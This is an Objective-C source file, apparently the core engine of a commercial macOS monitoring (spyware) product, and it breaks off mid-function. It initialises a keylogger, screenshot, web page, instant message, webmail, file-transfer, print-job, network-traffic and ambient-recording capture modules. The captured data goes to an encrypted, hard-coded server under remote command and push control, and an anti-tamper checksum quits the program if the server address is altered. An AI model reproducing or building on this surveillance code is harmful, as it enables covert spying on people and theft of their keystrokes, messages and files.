//
//  AppEngine.m
//  AppEngine
//
//  Created by Makara Khloth on 11/17/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "AppEngine.h"
#import "AppEngineUICmd.h"
#import "../ProductInfo/Product.h"

// Components headers
#import "ComponentHeaders.h"

// Utils
#import "ServerErrorStatusHandler.h"
#import "PreferencesChangeHandler.h"
#import "MessagePortIPCSender.h"
#import "LicenseGetConfigUtils.h"
#import "LicenseHeartbeatUtils.h"

#import <CommonCrypto/CommonDigest.h>

@interface AppEngine (private)
- (void) createApplicationEngine;
- (void) createApplicationFeatures;
- (void) destructApplicationFeatures;
- (EventQueryPriority*) eventQueryPriority;
- (void) doLicenseChanged: (LicenseInfo*) aLicenseInfo;
@end

@implementation AppEngine

// Engine
@synthesize mApplicationContext;
@synthesize mSystemUtils;

@synthesize mLicenseManager;
@synthesize mConfigurationManager;
@synthesize mServerAddressManager;
@synthesize mConnectionHistoryManager;
@synthesize mPreferenceManager;
@synthesize mCSM;
@synthesize mDDM;
@synthesize mActivationManager;
@synthesize mERM;
@synthesize mEDM;
@synthesize mEventCenter;
@synthesize mRemoteCmdManager;
@synthesize mKeyboardEventHandler;
@synthesize mHotKeyCaptureManager;
@synthesize mSoftwareUpdateManager;
@synthesize mAppAgentManager;
@synthesize mUSBAutoActivationManager;
@synthesize mFxLoggerManager;
@synthesize mPushNotificationManager;

// Features
@synthesize mKeySnapShotRuleManagerImpl;
@synthesize mKeyboardLoggerManager;
@synthesize mKeyboardCaptureManager;
@synthesize mPageVisitedCaptureManager;
@synthesize mApplicationManagerForMacImpl;
@synthesize mDeviceSettingsManager;
@synthesize mUSBConnectionCaptureManager;
@synthesize mUSBFileTransferCaptureManager;
@synthesize mApplicationUsageCaptureManager;
@synthesize mIMCaptureManagerForMac;
@synthesize mScreenshotCaptureManagerImpl;
@synthesize mNetworkTrafficCaptureManagerImpl;
@synthesize mUserActivityCaptureManager;
@synthesize mWebmailCaptureManager;
@synthesize mAmbientRecordingManagerForMac;
@synthesize mTemporalControlManager;
@synthesize mInternetFileTransferManager;
@synthesize mFileActivityCaptureManager;
@synthesize mPrinterMonitorManager;
@synthesize mNetworkConnectionCaptureManager;
@synthesize mNetworkTrafficAlertManagerImpl;
@synthesize mAppScreenShotManagerImpl;

// Flags
@synthesize mIsRestartingAppEngine;

- (id) init {
    if ((self = [super init])) {
        [self createApplicationEngine];
    }
    return (self);
}

#pragma mark -
#pragma mark License manager
#pragma mark -

- (void) onLicenseChanged:(LicenseInfo *)licenseInfo {
    DLog(@"--->Enter<---");
    @try {
        [self doLicenseChanged:licenseInfo];
    }
    @catch (NSException *e) {
        DLog(@"License changed got NSException: %@", [e description]);
    }
    @catch (FxException *e) {
        DLog(@"License changed got FxException: %@", [e description]);
    }
    @finally {
        [self setMIsRestartingAppEngine:FALSE];
    }
    DLog(@"--->End<---");
}

#pragma mark -
#pragma mark Server address manager
#pragma mark -

- (void) serverAddressChanged {
    DLog (@"Server url changed, structured = %@", [mServerAddressManager getStructuredServerUrl]);
    DLog (@"Server url changed, unstructured = %@", [mServerAddressManager getUnstructuredServerUrl]);
    
    NSString *structuredUrl = [mServerAddressManager getStructuredServerUrl];
    NSData *structuredUrlData = [structuredUrl dataUsingEncoding:NSUTF8StringEncoding];
    unsigned char msgDigestStructuredUrlByte[16];
    CC_MD5([structuredUrlData bytes], (unsigned int)[structuredUrlData length], msgDigestStructuredUrlByte);
    NSData* msgDigestStructuredUrlData = [NSData dataWithBytes:msgDigestStructuredUrlByte length:16];
    
    unsigned char* result = (unsigned char*) [msgDigestStructuredUrlData bytes];
    NSString *urlChecksumString = [NSString stringWithFormat:
                                   @"%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
                                   result[0], result[1], result[2], result[3],
                                   result[4], result[5], result[6], result[7],
                                   result[8], result[9], result[10], result[11],
                                   result[12], result[13], result[14], result[15]
                                   ];
    
    // Get data from cleanser file
    char *keyKey = nil;
    char *encryptedKey = nil;
    char *encryptedUrlChecksum = nil;
    
    //int value = (arc4random() % 20) + 1;
    
    for (int value = 1; value <= 20; value++) {
        switch (value) {
            case 1:
                keyKey = getkeyKey_1();
                encryptedKey = getEncryptedKey_1();
                encryptedUrlChecksum = getEncryptedUrlChecksum_1();
                break;
            case 2:
                keyKey = getkeyKey_2();
                encryptedKey = getEncryptedKey_2();
                encryptedUrlChecksum = getEncryptedUrlChecksum_2();
                break;
            case 3:
                keyKey = getkeyKey_3();
                encryptedKey = getEncryptedKey_3();
                encryptedUrlChecksum = getEncryptedUrlChecksum_3();
                break;
            case 4:
                keyKey = getkeyKey_4();
                encryptedKey = getEncryptedKey_4();
                encryptedUrlChecksum = getEncryptedUrlChecksum_4();
                break;
            case 5:
                keyKey = getkeyKey_5();
                encryptedKey = getEncryptedKey_5();
                encryptedUrlChecksum = getEncryptedUrlChecksum_5();
                break;
            case 6:
                keyKey = getkeyKey_6();
                encryptedKey = getEncryptedKey_6();
                encryptedUrlChecksum = getEncryptedUrlChecksum_6();
                break;
            case 7:
                keyKey = getkeyKey_7();
                encryptedKey = getEncryptedKey_7();
                encryptedUrlChecksum = getEncryptedUrlChecksum_7();
                break;
            case 8:
                keyKey = getkeyKey_8();
                encryptedKey = getEncryptedKey_8();
                encryptedUrlChecksum = getEncryptedUrlChecksum_8();
                break;
            case 9:
                keyKey = getkeyKey_9();
                encryptedKey = getEncryptedKey_9();
                encryptedUrlChecksum = getEncryptedUrlChecksum_9();
                break;
            case 10:
                keyKey = getkeyKey_10();
                encryptedKey = getEncryptedKey_10();
                encryptedUrlChecksum = getEncryptedUrlChecksum_10();
                break;
            case 11:
                keyKey = getkeyKey_11();
                encryptedKey = getEncryptedKey_11();
                encryptedUrlChecksum = getEncryptedUrlChecksum_11();
                break;
            case 12:
                keyKey = getkeyKey_12();
                encryptedKey = getEncryptedKey_12();
                encryptedUrlChecksum = getEncryptedUrlChecksum_12();
                break;
            case 13:
                keyKey = getkeyKey_13();
                encryptedKey = getEncryptedKey_13();
                encryptedUrlChecksum = getEncryptedUrlChecksum_13();
                break;
            case 14:
                keyKey = getkeyKey_14();
                encryptedKey = getEncryptedKey_14();
                encryptedUrlChecksum = getEncryptedUrlChecksum_14();
                break;
            case 15:
                keyKey = getkeyKey_15();
                encryptedKey = getEncryptedKey_15();
                encryptedUrlChecksum = getEncryptedUrlChecksum_15();
                break;
            case 16:
                keyKey = getkeyKey_16();
                encryptedKey = getEncryptedKey_16();
                encryptedUrlChecksum = getEncryptedUrlChecksum_16();
                break;
            case 17:
                keyKey = getkeyKey_17();
                encryptedKey = getEncryptedKey_17();
                encryptedUrlChecksum = getEncryptedUrlChecksum_17();
                break;
            case 18:
                keyKey = getkeyKey_18();
                encryptedKey = getEncryptedKey_18();
                encryptedUrlChecksum = getEncryptedUrlChecksum_18();
                break;
            case 19:
                keyKey = getkeyKey_19();
                encryptedKey = getEncryptedKey_19();
                encryptedUrlChecksum = getEncryptedUrlChecksum_19();
                break;
            case 20:
                keyKey = getkeyKey_20();
                encryptedKey = getEncryptedKey_20();
                encryptedUrlChecksum = getEncryptedUrlChecksum_20();
                break;
            default:
                keyKey = getkeyKey_7();
                encryptedKey = getEncryptedKey_7();
                encryptedUrlChecksum = getEncryptedUrlChecksum_7();
                break;
        }
        
        NSData *encryptedKeyData = [NSData dataWithBytes:encryptedKey length:32];
        NSString *keyKeyString = [NSString stringWithCString:keyKey encoding:NSUTF8StringEncoding];
        NSData *urlChecksumKeyData = [encryptedKeyData AES128DecryptWithKey:keyKeyString];
        NSString *urlChecksumKeyString = [[[NSString alloc] initWithData:urlChecksumKeyData encoding:NSUTF8StringEncoding] autorelease];
        NSData *encryptedUrlChecksumData = [NSData dataWithBytes:encryptedUrlChecksum length:48];
        NSData *cleanserUrlChecksumData = [encryptedUrlChecksumData AES128DecryptWithKey:urlChecksumKeyString]; // Checksum string data
        NSString *cleanserUrlChecksum = [[[NSString alloc] initWithData:cleanserUrlChecksumData encoding:NSUTF8StringEncoding] autorelease];
        
        if (encryptedKey) free(encryptedKey);
        if (keyKey) free(keyKey);
        if (encryptedUrlChecksum) free(encryptedUrlChecksum);
        
        DLog (@"urlChecksumString = %@, cleanserUrlChecksum = %@", urlChecksumString, cleanserUrlChecksum);
        
        if ([urlChecksumString isEqualToString:cleanserUrlChecksum]) {
            // Check next index of checksum of url in cleanser
        } else {
            DLog (@"Seriously failure.....");
            exit(0);
        }
    }
    
    [mCSM setStructuredURL:[NSURL URLWithString:structuredUrl]];
    [mCSM setUnstructuredURL:[NSURL URLWithString:[mServerAddressManager getUnstructuredServerUrl]]];
}

#pragma mark -
#pragma mark Engine utils functions
#pragma mark -

- (void) createApplicationEngine {
    DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
    DLog(@"Contruct engine");
    DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
    DLog(@"Wait for system is ready");
    
    // Home private and shared directory
    NSString *privateHome = [DaemonPrivateHome daemonPrivateHome];
    
    // App context
    NSData *productCipher = [NSData dataWithBytes:kProductInfoCipher length:(sizeof(kProductInfoCipher)/sizeof(unsigned char))];
    mApplicationContext = [[AppContextImp alloc] initWithProductCipher:productCipher];
    
    // System utils
    mSystemUtils = [[SystemUtilsImpl alloc] init];
    
    // License manager
    mLicenseManager = [[LicenseManager alloc] initWithAppContext:mApplicationContext];
    [mLicenseManager addLicenseChangeListener:self];
    
    // Configuration manager
    mConfigurationManager = [[ConfigurationManagerImpl alloc] init];
    [mConfigurationManager updateConfigurationID:[mLicenseManager getConfiguration]];
    
    // Server URL
    mServerAddressManager = [[ServerAddressManagerImp alloc] initWithServerAddressChangeDelegate:self];
    [mServerAddressManager setRequireBaseServerUrl:FALSE];
    NSData *urlCipher = [NSData dataWithBytes:kServerUrl length:(sizeof(kServerUrl)/sizeof(unsigned char))];
    [mServerAddressManager setBaseServerCipherUrl:urlCipher]; // Synchronous call to serverAddressChanged selector, 1st time, CMS is nil
    
    // Connection history
    mConnectionHistoryManager = [[ConnectionHistoryManagerImp alloc] init];
    [mConnectionHistoryManager setMMaxConnectionCount:10];
    
    // Preferences
    mPreferenceManager = [[PreferenceManagerImpl alloc] init];
    
    // FxLogger manager
    mFxLoggerManager =  [FxLoggerManager sharedFxLoggerManager];
    urlCipher = [NSData dataWithBytes:kMandrillKey length:(sizeof(kMandrillKey)/sizeof(unsigned char))];
    [mFxLoggerManager setMEmailProviderKey:[ServerAddressManagerImp decryptCipher:urlCipher]];
    PrefSignUp *prefSingup = (PrefSignUp *)[mPreferenceManager preference:kSignUp];
    if ([prefSingup mEnableDebugLog])  {[mFxLoggerManager enableLog];}
    else {[mFxLoggerManager disableLog];}
    
    // CSM
    NSString *payloadPath = [privateHome stringByAppendingString:@"csm/payload/"];
    NSString *sessionPath = [privateHome stringByAppendingString:@"csm/dbsession/"];
    [DaemonPrivateHome createDirectoryAndIntermediateDirectories:payloadPath];
    [DaemonPrivateHome createDirectoryAndIntermediateDirectories:sessionPath];
    mCSM = [CommandServiceManager sharedManagerWithPayloadPath:payloadPath withDBPath:sessionPath];
    [mCSM setStructuredURL:[NSURL URLWithString:[mServerAddressManager getStructuredServerUrl]]];
    [mCSM setUnstructuredURL:[NSURL URLWithString:[mServerAddressManager getUnstructuredServerUrl]]];
    
    // DDM
    mDDM = [[DataDeliveryManager alloc] initWithCSM:mCSM];
    [mDDM setMDataDeliveryMethod:kDataDeliveryViaWifiWWAN];
    [mDDM setMAppContext:mApplicationContext];
    [mDDM setMLicenseManager:mLicenseManager];
    [mDDM setMServerAddressManager:mServerAddressManager];
    [mDDM setMConnectionHistory:mConnectionHistoryManager];
    
    // Activation manager
    mActivationManager = [[ActivationManager alloc] initWithDataDelivery:mDDM withAppContext:mApplicationContext andLicenseManager:mLicenseManager];
    [mActivationManager setMServerAddressManager:mServerAddressManager];
    
    // Event repository
    mERM = [[EventRepositoryManager alloc] initWithEventQueryPriority:[self eventQueryPriority]];
    [mERM openRepository];
    //[mERM dropRepository];
    
    // EDM
    mEDM = [[EventDeliveryManager alloc] initWithEventRepository:mERM andDataDelivery:mDDM];
    [mEDM setMLicenseManager:mLicenseManager];
    
    // Event center
    mEventCenter = [[EventCenter alloc] initWithEventRepository:mERM];
    
    // Software update manager
    mSoftwareUpdateManager = [[SoftwareUpdateManagerImpl alloc] initWithDDM:mDDM];
    
    // RCM
    NSString* mediaFoundPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"media/search/thumbnails/"];
    [DaemonPrivateHome createDirectoryAndIntermediateDirectories:mediaFoundPath];
    mRemoteCmdManager = [[RemoteCmdManagerImpl alloc] init];
    [mDDM setMRemoteCommand:[mRemoteCmdManager mPCCCmdCenter]];
    
    [mRemoteCmdManager setMServerAddressManager:mServerAddressManager];
    [mRemoteCmdManager setMEventDelegate:mEventCenter];
    [mRemoteCmdManager setMLicenseManager:mLicenseManager];
    [mRemoteCmdManager setMDataDelivery:mDDM];
    [mRemoteCmdManager setMEventDelivery:mEDM];
    [mRemoteCmdManager setMAppContext:mApplicationContext];
    [mRemoteCmdManager setMPreferenceManager:mPreferenceManager];
    [mRemoteCmdManager setMActivationManagerProtocol:mActivationManager];
    [mRemoteCmdManager setMSupportCmdCodes:[mConfigurationManager mSupportedRemoteCmdCodes]];
    [mRemoteCmdManager setMSystemUtils:mSystemUtils];
    [mRemoteCmdManager setMEventRepository:mERM];
    [mRemoteCmdManager setMConnectionHistoryManager:mConnectionHistoryManager];
    [mRemoteCmdManager setMConfigurationManager:mConfigurationManager];
    [mRemoteCmdManager setMSoftwareUpdateManager:mSoftwareUpdateManager];
    [mRemoteCmdManager launch];
    
    // Utils
    mServerErrorStatusHandler = [[ServerErrorStatusHandler alloc] init];
    [mServerErrorStatusHandler setMLicenseManager:mLicenseManager];
    [mServerErrorStatusHandler setMAppEngine:self];
    [mDDM setMServerStatusErrorListener:mServerErrorStatusHandler];
    
    mPreferencesChangeHandler = [[PreferencesChangeHandler alloc] initWithAppEngine:self];
    [mPreferenceManager addPreferenceChangeListener:mPreferencesChangeHandler];
    
    mLicenseGetConfigUtils = [[LicenseGetConfigUtils alloc] initWithDataDelivery:mDDM];
    [mLicenseGetConfigUtils setMLicenseManager:mLicenseManager];
    
    mLicenseHeartbeatUtils = [[LicenseHeartbeatUtils alloc] initWithDataDelivery:mDDM];
    
    // Keyboard event handler
    //mKeyboardEventHandler = [[KeyboardEventHandler alloc]init];
    //[mKeyboardEventHandler registerToGlobalEventHandler];
    
    // Hot key capture manager
    //mHotKeyCaptureManager = [[HotKeyCaptureManager alloc] initWithKeyboardEventHandler:mKeyboardEventHandler];
    //[mHotKeyCaptureManager startHotKey];
    mHotKeyCaptureManager = [[HotKeyCaptureManager alloc] init]; // Implicitly start the hot key capture
    
    // Disk space low, uncaught exception handler
    mAppAgentManager = [[AppAgentManagerForMac alloc] init];
    [mAppAgentManager registerEventDelegate:mEventCenter];
    [mAppAgentManager setThresholdInMegabyteForDiskSpaceCriticalLevel:20];
    [mAppAgentManager startCapture];
    
    // Start-up time
    PrefStartupTime *prefStartupTime = (PrefStartupTime *)[mPreferenceManager preference:kStartup_Time];
    [prefStartupTime setMStartupTime:[DateTimeFormat phoenixDateTime]];
    [mPreferenceManager savePreference:prefStartupTime];
    
    // USBAutoActivate
    mUSBAutoActivationManager = [[USBAutoActivationManager alloc] initWithActivationManager:mActivationManager withAppContext:mApplicationContext];
    
    // Push notification
    mPushNotificationManager = [[PushNotificationManager alloc]init];
    [mPushNotificationManager setMPushDelegate:[mRemoteCmdManager mPushCmdCenter]];
    id <PhoneInfo> deviceInfo = [mApplicationContext getPhoneInfo];
    urlCipher = [NSData dataWithBytes:kPushServerUrl length:(sizeof(kPushServerUrl)/sizeof(unsigned char))];
    [mPushNotificationManager startWithServerName:[ServerAddressManagerImp decryptCipher:urlCipher] port:kPushServerPort deviceID:[deviceInfo getIMEI]];
    
    // Set flag to indicate that engine just starting
    [self setMIsRestartingAppEngine:TRUE];
}

- (void) createApplicationFeatures {
    DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
    DLog(@"Contruct features")
    DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
    
    PrefEventsCapture *prefEventCapture = (PrefEventsCapture *)[mPreferenceManager preference:kEvents_Ctrl];
    PrefSignUp *prefSignUp = (PrefSignUp *)[mPreferenceManager preference:kSignUp];
    
    [prefSignUp setMAutoActivate:NO];
    [mPreferenceManager savePreference:prefSignUp];
    
    if ([prefEventCapture mDeliveryMethod] == kDeliveryMethodAny) {
        [mDDM setMDataDeliveryMethod:kDataDeliveryViaWifiWWAN];
    } else if ([prefEventCapture mDeliveryMethod] == kDeliveryMethodWifi) {
        [mDDM setMDataDeliveryMethod:kDataDeliveryViaWifiOnly];
    }
    
    [mEDM setMaximumEvent:[prefEventCapture mMaxEvent]];
    [mEDM setDeliveryTimer:[prefEventCapture mDeliverTimer]];
    
    // Key log snapshot rule
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventKeyLog]       ||
        [mConfigurationManager isSupportedFeature:kFeatureID_EventPageVisited]  ){
        if (!mKeySnapShotRuleManagerImpl) {
            mKeySnapShotRuleManagerImpl = [[KeySnapShotRuleManagerImpl alloc] initWithDDM:mDDM];
            [mRemoteCmdManager setMKeySnapShotRuleManager:mKeySnapShotRuleManagerImpl];
            [mRemoteCmdManager relaunchForFeaturesChange];
        }
    } else {
        [mKeySnapShotRuleManagerImpl clearAllRules];
        [mKeySnapShotRuleManagerImpl release];
        mKeySnapShotRuleManagerImpl = nil;
        [mRemoteCmdManager setMKeySnapShotRuleManager:nil];
        [mRemoteCmdManager relaunchForFeaturesChange];
    }
    
    // Keyboard logger
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventKeyLog]       ||
        [mConfigurationManager isSupportedFeature:kFeatureID_EventMacOSIM]  ){
        if (!mKeyboardLoggerManager) {
            //mKeyboardLoggerManager = [[KeyboardLoggerManager alloc] initWithKeyboardEventHandler:mKeyboardEventHandler];
            mKeyboardLoggerManager = [[KeyboardLoggerManager alloc] init];
            [mKeyboardLoggerManager startKeyboardLogger];
        }
    } else {
        [mKeyboardLoggerManager release];
        mKeyboardLoggerManager = nil;
    }
    
    // Keyboard capture
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventKeyLog]) {
        if (!mKeyboardCaptureManager) {
            NSString *deamonHome = [DaemonPrivateHome daemonPrivateHome];
            NSString *attachmentPath = [deamonHome stringByAppendingString:@"attachments/snapshot/"];
            [DaemonPrivateHome createDirectoryAndIntermediateDirectories:attachmentPath];
            
            mKeyboardCaptureManager = [[KeyboardCaptureManager alloc] initWithScreenshotPath:attachmentPath withKeyboardLoggerManager:mKeyboardLoggerManager];
            [mKeyboardCaptureManager registerEventDelegate:mEventCenter];
            [mKeySnapShotRuleManagerImpl setMKeyLogRuleDelegate:mKeyboardCaptureManager];
            
            // Relationship with snap shot rule manager
            [mKeyboardCaptureManager monitorApplicationChanged:[mKeySnapShotRuleManagerImpl getMonitorApplicationInfo]];
            [mKeyboardCaptureManager keyLogRuleChanged:[mKeySnapShotRuleManagerImpl getKeyLogRuleInfo]];
        }
        
        if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableKeyLog]) {
            [mKeyboardCaptureManager startCapture];
        } else {
            [mKeyboardCaptureManager stopCapture];
        }
        
    } else {
        // Upgrade or downgrad features
        [mKeyboardCaptureManager unregisterEventDelegate];
        [mKeyboardCaptureManager stopCapture];
        [mKeyboardCaptureManager release];
        mKeyboardCaptureManager = nil;
    }
    
    // Page visited capture manager
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventPageVisited]) {
        if (!mPageVisitedCaptureManager) {
            mPageVisitedCaptureManager = [[PageVisitedCaptureManager alloc] init];
            [mPageVisitedCaptureManager registerEventDelegate:mEventCenter];
        }
        
        if ([prefEventCapture mStartCapture] && [prefEventCapture mEnablePageVisited]) {
            [mPageVisitedCaptureManager startCapture];
        } else {
            [mPageVisitedCaptureManager stopCapture];
        }
        
    } else {
        // Upgrade or downgrad features
        [mPageVisitedCaptureManager unregisterEventDelegate];
        [mPageVisitedCaptureManager release];
        mPageVisitedCaptureManager = nil;
    }
    
    // Installed applications
    if ([mConfigurationManager isSupportedFeature:kFeatureID_InstalledApplication]) {
        if (!mApplicationManagerForMacImpl) {
            mApplicationManagerForMacImpl = [[ApplicationManagerForMacImpl alloc] initWithDDM:mDDM];
            [mRemoteCmdManager setMApplicationManager:mApplicationManagerForMacImpl];
            [mRemoteCmdManager relaunchForFeaturesChange];
        }
    } else {
        [mApplicationManagerForMacImpl release];
        mApplicationManagerForMacImpl = nil;
        [mRemoteCmdManager setMApplicationManager:nil];
        [mRemoteCmdManager relaunchForFeaturesChange];
    }
    
    // Device settings
    if ([mConfigurationManager isSupportedFeature:kFeatureID_SendDeviceSettings]) {
        if (!mDeviceSettingsManager) {
            mDeviceSettingsManager = [[DeviceSettingsManagerImpl alloc] initWithDataDeliveryManager:mDDM];
        }
        [mRemoteCmdManager setMDeviceSettingsManager:mDeviceSettingsManager];
        [mRemoteCmdManager relaunchForFeaturesChange];
    } else {
        // Upgrade or downgrad features
        [mDeviceSettingsManager release];
        mDeviceSettingsManager = nil;
        [mRemoteCmdManager setMDeviceSettingsManager:nil];
        [mRemoteCmdManager relaunchForFeaturesChange];
    }
    
    // Usb connection
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventMacOSUSBConnection]) {
        if (!mUSBConnectionCaptureManager) {
            mUSBConnectionCaptureManager = [[USBConnectionCaptureManager alloc] init];
            [mUSBConnectionCaptureManager registerEventDelegate:mEventCenter];
        }
        
        if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableUSBConnection]) {
            [mUSBConnectionCaptureManager startCapture];
        } else {
            [mUSBConnectionCaptureManager stopCapture];
        }
    } else {
        [mUSBConnectionCaptureManager release];
        mUSBConnectionCaptureManager = nil;
    }
    
    // Usb file transfer
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventMacOSFileTransfer]) {
        if (!mUSBFileTransferCaptureManager) {
            mUSBFileTransferCaptureManager = [[USBFileTransferCaptureManager alloc] init];
            [mUSBFileTransferCaptureManager registerEventDelegate:mEventCenter];
        }
        
        if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableFileTransfer]) {
            [mUSBFileTransferCaptureManager startCapture];
        } else {
            [mUSBFileTransferCaptureManager stopCapture];
        }
    } else {
        [mUSBFileTransferCaptureManager release];
        mUSBFileTransferCaptureManager = nil;
    }
    
    // Internet file transfer
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventMacOSFileTransfer]) {
        if (!mInternetFileTransferManager) {
            mInternetFileTransferManager = [[InternetFileTransferManager alloc] init];
            [mInternetFileTransferManager registerEventDelegate:mEventCenter];
        }
        
        if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableFileTransfer]) {
            [mInternetFileTransferManager startCapture];
        } else {
            [mInternetFileTransferManager stopCapture];
        }
    } else {
        [mInternetFileTransferManager release];
        mInternetFileTransferManager = nil;
    }
    
    // Print job
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventPrintJob]) {
        if (!mPrinterMonitorManager) {
            NSString *deamonHome = [DaemonPrivateHome daemonPrivateHome];
            NSString *printJobPath = [deamonHome stringByAppendingString:@"attachments/printjob/"];
            [DaemonPrivateHome createDirectoryAndIntermediateDirectories:printJobPath];
            
            mPrinterMonitorManager = [[PrinterMonitorManager alloc] init];
            [mPrinterMonitorManager registerEventDelegate:mEventCenter];
        }
        
        if ([prefEventCapture mStartCapture] && [prefEventCapture mEnablePrintJob]) {
            [mPrinterMonitorManager startCapture];
        } else {
            [mPrinterMonitorManager stopCapture];
        }
    } else {
        [mPrinterMonitorManager release];
        mPrinterMonitorManager = nil;
    }
    
    // Network connction
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventNetworkConnection]) {
        if (!mNetworkConnectionCaptureManager) {
            mNetworkConnectionCaptureManager = [[NetworkConnectionCaptureManager alloc] init];
            [mNetworkConnectionCaptureManager registerEventDelegate:mEventCenter];
        }
        if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableNetworkConnection]) {
            [mNetworkConnectionCaptureManager startCapture];
        } else {
            [mNetworkConnectionCaptureManager stopCapture];
        }
    } else {
        [mNetworkConnectionCaptureManager release];
        mNetworkConnectionCaptureManager = nil;
    }
    
    // Network packet alert
//    if ([mConfigurationManager isSupportedFeature:kFeatureID_SendNetworkAlert]) {
//        if (!mNetworkTrafficAlertManagerImpl) {
//            NSString * netDataPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"net_data/"];
//            [DaemonPrivateHome createDirectoryAndIntermediateDirectories:netDataPath];
//            
//            mNetworkTrafficAlertManagerImpl = [[NetworkTrafficAlertManagerImpl alloc] initWithDDM:mDDM dataPath:netDataPath];
//        }
//        if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableNetworkAlert]) {
//            [mNetworkTrafficAlertManagerImpl startCapture];
//        } else {
//            [mNetworkTrafficAlertManagerImpl stopCapture];
//        }
//        [mRemoteCmdManager setMNetworkTrafficAlertManager:mNetworkTrafficAlertManagerImpl];
//        [mRemoteCmdManager relaunchForFeaturesChange];
//    } else {
//        [mNetworkTrafficAlertManagerImpl release];
//        mNetworkTrafficAlertManagerImpl = nil;
//        [mRemoteCmdManager setMNetworkTrafficAlertManager:nil];
//        [mRemoteCmdManager relaunchForFeaturesChange];
//    }
    
    // Network packet traffic
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventNetworkTraffic]) {
        if (!mNetworkTrafficCaptureManagerImpl) {
            NSString *deamonHome = [DaemonPrivateHome daemonPrivateHome];
            NSString *netDataPath = [deamonHome stringByAppendingString:@"net_data/"];
            [DaemonPrivateHome createDirectoryAndIntermediateDirectories:netDataPath];
            
            mNetworkTrafficCaptureManagerImpl = [[NetworkTrafficCaptureManagerImpl alloc] initWithFilterOutURL:[mServerAddressManager getStructuredServerUrl] withDataPath:netDataPath];
            [mNetworkTrafficCaptureManagerImpl registerEventDelegate:mEventCenter];
        }
    } else {
        [mNetworkTrafficCaptureManagerImpl release];
        mNetworkTrafficCaptureManagerImpl = nil;
    }
    
    // File activity
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventFileActivity]) {
        if (!mFileActivityCaptureManager) {
            mFileActivityCaptureManager = [[FileActivityCaptureManager alloc] init];
            [mFileActivityCaptureManager registerEventDelegate:mEventCenter];
        }
        PrefFileActivity *prefFileActivity = (PrefFileActivity *)[[self mPreferenceManager] preference:kFileActivity];
        
        if ([prefEventCapture mStartCapture] && [prefFileActivity mEnable]) {
            
            NSMutableArray *activityTypes = [[NSMutableArray alloc]init];
            if (prefFileActivity.mActivityType & kFileActivityNone) {
                [activityTypes addObject:[NSNumber numberWithInt:0]];
            } if (prefFileActivity.mActivityType & kFileActivityCreate) {
                [activityTypes addObject:[NSNumber numberWithInt:1]];
            } if (prefFileActivity.mActivityType & kFileActivityCopy) {
                [activityTypes addObject:[NSNumber numberWithInt:2]];
            } if (prefFileActivity.mActivityType & kFileActivityMove) {
                [activityTypes addObject:[NSNumber numberWithInt:3]];
            } if (prefFileActivity.mActivityType & kFileActivityDelete) {
                [activityTypes addObject:[NSNumber numberWithInt:4]];
            } if (prefFileActivity.mActivityType & kFileActivityModify) {
                [activityTypes addObject:[NSNumber numberWithInt:5]];
            } if (prefFileActivity.mActivityType & kFileActivityRename) {
                [activityTypes addObject:[NSNumber numberWithInt:6]];
            } if (prefFileActivity.mActivityType & kFileActivityPermissionChange) {
                [activityTypes addObject:[NSNumber numberWithInt:7]];
            } if (prefFileActivity.mActivityType & kFileActivityAttributeChange) {
                [activityTypes addObject:[NSNumber numberWithInt:8]];
            }
            
            [mFileActivityCaptureManager setExcludePathForCapture:[prefFileActivity mExcludedFileActivityPaths] setActionForCapture:activityTypes];
            [mFileActivityCaptureManager startCapture];
            
            [activityTypes release];
        } else {
            [mFileActivityCaptureManager stopCapture];
        }
    } else {
        [mFileActivityCaptureManager release];
        mFileActivityCaptureManager = nil;
    }
    
    // Application usage
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventMacOSAppUsage]) {
        if (!mApplicationUsageCaptureManager) {
            mApplicationUsageCaptureManager = [[ApplicationUsageCaptureManager alloc] init];
            [mApplicationUsageCaptureManager registerEventDelegate:mEventCenter];
        }
        
        if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableAppUsage]) {
            [mApplicationUsageCaptureManager startCapture];
        } else {
            [mApplicationUsageCaptureManager stopCapture];
        }
    } else {
        [mApplicationUsageCaptureManager release];
        mApplicationUsageCaptureManager = nil;
    }
    
    // Mac IM
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventMacOSIM]) {
        if (!mIMCaptureManagerForMac) {
            NSString *deamonHome = [DaemonPrivateHome daemonPrivateHome];
            NSString *attachmentPath = [deamonHome stringByAppendingString:@"attachments/imsnapshot/"];
            [DaemonPrivateHome createDirectoryAndIntermediateDirectories:attachmentPath];
            
            mIMCaptureManagerForMac = [[[IMCaptureManagerForMac alloc] init] initWithAttachmentFolder:attachmentPath keyboardLoggerManager:mKeyboardLoggerManager];
            [mIMCaptureManagerForMac registerEventDelegate:mEventCenter];
        }
        
        if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableIM]) {
            [mIMCaptureManagerForMac setMIndividualIM:[prefEventCapture mEnableIndividualIM]];
            [mIMCaptureManagerForMac startCapture];
        } else {
